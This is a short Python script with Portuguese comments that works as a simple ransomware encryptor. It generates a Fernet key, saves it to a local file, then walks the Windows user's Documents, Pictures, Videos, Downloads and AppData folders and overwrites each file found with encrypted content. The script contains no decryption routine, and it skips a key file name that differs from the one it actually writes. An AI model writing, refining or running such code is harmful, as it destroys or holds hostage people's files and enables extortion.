import os
from cryptography.fernet import Fernet

#criar a chave para criptografar a descritpgrafar
key = Fernet.generate_key()
with open("key.pem", "wb") as key_file:
    key_file.write(key)

# lista os arquivos que iremos criptografar
username = os.getenv("USERNAME")
folders = [
    os.path.join(r"c:\Users", username, "Documents"),
    os.path.join(r"c:\Users", username, "Pictures"),
    os.path.join(r"c:\Users", username, "Videos"),
    os.path.join(r"c:\Users", username, "Downloads"),
    os.path.join(r"c:\Users", username, "AppData", "Local"),
    os.path.join(r"c:\Users", username, "AppData", "Roaming"),
]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in ["encrypt.py", "key_file.key", "desktop.ini"]:
                continue

            file_path = os.path.join(root, file)
            arquivos.append(file_path)

# criptgrafar os arquivos
for arquivo in arquivos:
    with open(arquivo, "rb") as file:
        conteudo = file.read()

    conteudo_criptografado = Fernet(key).encrypt(conteudo)

    with open(arquivo, "wb") as file:
        file.write(conteudo_criptografado)